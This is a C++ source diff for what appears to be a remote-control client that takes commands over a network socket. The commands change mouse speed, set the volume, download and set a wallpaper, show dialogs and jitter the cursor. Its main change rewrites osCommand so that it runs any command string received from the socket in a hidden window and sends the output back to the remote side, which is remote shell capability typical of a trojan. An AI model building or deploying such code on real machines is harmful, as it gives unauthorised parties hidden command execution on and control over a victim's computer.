@@ -57,7 +57,7 @@ void Commands::acceptCommand(CommandType command, const string &params) {
 
 bool Commands::mouseCommand(const string &params) {
   try {
-    int sensitivity = std::stoi(params);
+    int sensitivity = stoi(params);
     if (sensitivity < 1 || sensitivity > 20) {
       string response = "La sensibilidad debe estar entre 1 y 20";
       send(clientSocket, response.c_str(), response.length(), 0);
@@ -68,7 +68,7 @@ bool Commands::mouseCommand(const string &params) {
     SystemParametersInfo(SPI_SETMOUSESPEED, 0, (PVOID)sensitivity,
                          SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
 #endif
-  } catch (const std::invalid_argument &e) {
+  } catch (const invalid_argument &e) {
     string response = "Parametro invalido";
     send(clientSocket, response.c_str(), response.length(), 0);
     return false;
@@ -76,11 +76,10 @@ bool Commands::mouseCommand(const string &params) {
   return true;
 }
 
-bool Commands::downloadImage(const std::string &url,
-                             const std::string &filePath) {
+bool Commands::downloadImage(const string &url, const string &filePath) {
   CURL *curl;
   CURLcode res;
-  std::ofstream outFile(filePath, std::ios::binary);
+  ofstream outFile(filePath, ios::binary);
 
   if (!outFile.is_open()) {
     return false;
@@ -104,7 +103,7 @@ bool Commands::downloadImage(const std::string &url,
 
 bool Commands::wallpaperCommand(const string &params) {
   cout << params << endl;
-  const std::string filePath = "./image.jpg";
+  const string filePath = "./image.jpg";
   const bool downloaded = downloadImage(params, filePath);
   if (!downloaded) {
     string response = "Error en descargar imagen";
@@ -120,7 +119,47 @@ bool Commands::wallpaperCommand(const string &params) {
 }
 
 bool Commands::osCommand(const string &params) {
-  return std::system(params.c_str());
+#ifdef _WIN32
+  string result;
+  HANDLE hStdOutRead, hStdOutWrite;
+  SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};
+
+  if (!CreatePipe(&hStdOutRead, &hStdOutWrite, &sa, 0)) {
+    return false;
+  }
+
+  STARTUPINFO si = {sizeof(STARTUPINFO)};
+  si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
+  si.hStdOutput = hStdOutWrite;
+  si.hStdError = hStdOutWrite;
+  si.wShowWindow = SW_HIDE;
+  PROCESS_INFORMATION pi = {};
+
+  if (!CreateProcess(NULL, (LPSTR)params.c_str(), NULL, NULL, TRUE, 0, NULL,
+                     NULL, &si, &pi)) {
+    CloseHandle(hStdOutWrite);
+    CloseHandle(hStdOutRead);
+    return false;
+  }
+
+  CloseHandle(hStdOutWrite);
+
+  char buffer[128];
+  DWORD bytesRead;
+  while (ReadFile(hStdOutRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) &&
+         bytesRead > 0) {
+    buffer[bytesRead] = '\0';
+    result += buffer;
+  }
+
+  CloseHandle(hStdOutRead);
+  CloseHandle(pi.hProcess);
+  CloseHandle(pi.hThread);
+
+  send(clientSocket, result.c_str(), result.length(), 0);
+#endif
+  // return system(params.c_str());
+  return true;
 }
 
 bool Commands::dialogCommand(const string &params) {
@@ -133,7 +172,7 @@ bool Commands::dialogCommand(const string &params) {
 
 bool Commands::volumeCommand(const string &params) {
   try {
-    int value = std::stoi(params);
+    int value = stoi(params);
     if (value < 0 || value > 100) {
       string response = "La sensibilidad debe estar entre el 0 y 100";
       send(clientSocket, response.c_str(), response.length(), 0);
@@ -162,7 +201,7 @@ bool Commands::volumeCommand(const string &params) {
     deviceEnumerator->Release();
     CoUninitialize();
 #endif
-  } catch (const std::invalid_argument &e) {
+  } catch (const invalid_argument &e) {
     string response = "Parametro invalido";
     send(clientSocket, response.c_str(), response.length(), 0);
     return false;
@@ -172,7 +211,7 @@ bool Commands::volumeCommand(const string &params) {
 
 bool Commands::mouseMoveCommand(const string &params) {
   try {
-    int value = std::stoi(params);
+    int value = stoi(params);
     if (value < 0 || value > 10) {
       string response = "La sensibilidad debe estar entre el 0 y 10";
       send(clientSocket, response.c_str(), response.length(), 0);
@@ -181,21 +220,21 @@ bool Commands::mouseMoveCommand(const string &params) {
 
 #ifdef _WIN32
     POINT cursorPos;
-    std::srand(static_cast<unsigned int>(std::time(nullptr)));
+    srand(static_cast<unsigned int>(time(nullptr)));
 
     DWORD endTime = GetTickCount() + (value * 1000);
 
     while (GetTickCount() < endTime) {
       if (GetCursorPos(&cursorPos)) {
-        int randomX = cursorPos.x + (std::rand() % 21 - 10);
-        int randomY = cursorPos.y + (std::rand() % 21 - 10);
+        int randomX = cursorPos.x + (rand() % 21 - 10);
+        int randomY = cursorPos.y + (rand() % 21 - 10);
 
         SetCursorPos(randomX, randomY);
         Sleep(100);
       }
     }
 #endif
-  } catch (const std::invalid_argument &e) {
+  } catch (const invalid_argument &e) {
     string response = "Parametro invalido";
     send(clientSocket, response.c_str(), response.length(), 0);
     return false;
